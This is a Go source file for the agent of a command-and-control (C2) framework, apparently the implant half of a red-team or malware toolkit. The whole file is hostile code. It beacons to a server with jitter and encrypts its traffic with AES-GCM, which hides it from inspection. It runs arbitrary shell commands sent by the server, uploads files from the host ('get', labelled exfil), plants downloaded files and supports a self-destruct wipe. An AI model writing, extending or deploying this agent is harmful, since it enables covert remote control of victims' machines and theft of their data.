package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"

	"c2-agent/funcs"
)

type CheckInPayload struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type CheckInResponse struct {
	Status string `json:"status"`
	Tasks  []Task `json:"tasks"`
}

type Task struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type ResultPayload struct {
	TaskID int    `json:"task_id"`
	Output string `json:"output"`
}

func main() {
	InitConfig()

	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", JitterMin, JitterMax)

	for {
		tasks, err := checkIn(hostname, agentOS)
		if err != nil {
			fmt.Printf("[!] Check-in failed: %v\n", err)
			funcs.SleepWithJitter(JitterMin, JitterMax)
			continue
		}

		fmt.Printf("[+] Checked in - %d pending task(s)\n", len(tasks))

		for _, task := range tasks {
			fmt.Printf("[>] Executing task #%d: %s\n", task.ID, task.Command)

			if task.Command == "__selfdestruct__" {
				fmt.Println("[!] Self-destruct command received from server!")
				_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
				funcs.SelfDestruct()
			}

			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
			if funcs.IsCdCommand(task.Command) {
				output, cdErr := funcs.ExecuteCommand(task.Command)
				if cdErr != nil {
					output = fmt.Sprintf("Error: %v", cdErr)
				}
				fmt.Printf("[<] Task #%d result: %s\n", task.ID, output)
				_ = sendResult(task.ID, output)
				continue
			}

			if strings.HasPrefix(task.Command, "get ") {
				go func(t Task) {
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.UploadFile(ServerURL, AgentID, filePath)
					if err != nil {
						output = fmt.Sprintf("Exfil error: %v", err)
					}
					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
					_ = sendResult(t.ID, output)
				}(task)
				continue
			}

			if strings.HasPrefix(task.Command, "download ") {
				go func(t Task) {
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {
						_ = sendResult(t.ID, "Usage: download <file_id> <save_path>")
						return
					}
					output, err := funcs.DownloadFile(ServerURL, parts[0], strings.TrimSpace(parts[1]))
					if err != nil {
						output = fmt.Sprintf("Download error: %v", err)
					}
					fmt.Printf("[<] Task #%d result: %s\n", t.ID, output)
					_ = sendResult(t.ID, output)
				}(task)
				continue
			}

			go func(t Task) {
				output, execErr := funcs.ExecuteCommand(t.Command)
				if execErr != nil && output == "" {
					output = fmt.Sprintf("Error: %v", execErr)
				}
				fmt.Printf("[<] Task #%d result (%d bytes)\n", t.ID, len(output))
				err := sendResult(t.ID, output)
				if err != nil {
					fmt.Printf("[!] Failed to send result for task #%d: %v\n", t.ID, err)
				}
			}(task)
		}

		funcs.SleepWithJitter(JitterMin, JitterMax)
	}
}

func checkIn(hostname, agentOS string) ([]Task, error) {
	payload := CheckInPayload{
		AgentID:  AgentID,
		Hostname: hostname,
		OS:       agentOS,
	}

	respBody, err := encryptedPost(ServerURL+"/api/checkin", payload)
	if err != nil {
		return nil, err
	}

	// Unwrap the encrypted response envelope
	var envelope struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal(respBody, &envelope); err != nil {
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}

	plain, err := funcs.Decrypt(EncryptionKey, envelope.Data)
	if err != nil {
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}

	var result CheckInResponse
	if err := json.Unmarshal(plain, &result); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}
	return result.Tasks, nil
}

func sendResult(taskID int, output string) error {
	payload := ResultPayload{
		TaskID: taskID,
		Output: output,
	}
	_, err := encryptedPost(ServerURL+"/api/result", payload)
	return err
}

// encryptedPost JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {kid, data} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func encryptedPost(url string, payload any) ([]byte, error) {
	inner, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("marshal: %w", err)
	}

	enc, err := funcs.Encrypt(EncryptionKey, inner)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	envelope := map[string]string{"kid": KeyID, "data": enc}
	body, err := json.Marshal(envelope)
	if err != nil {
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("post: %w", err)
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}
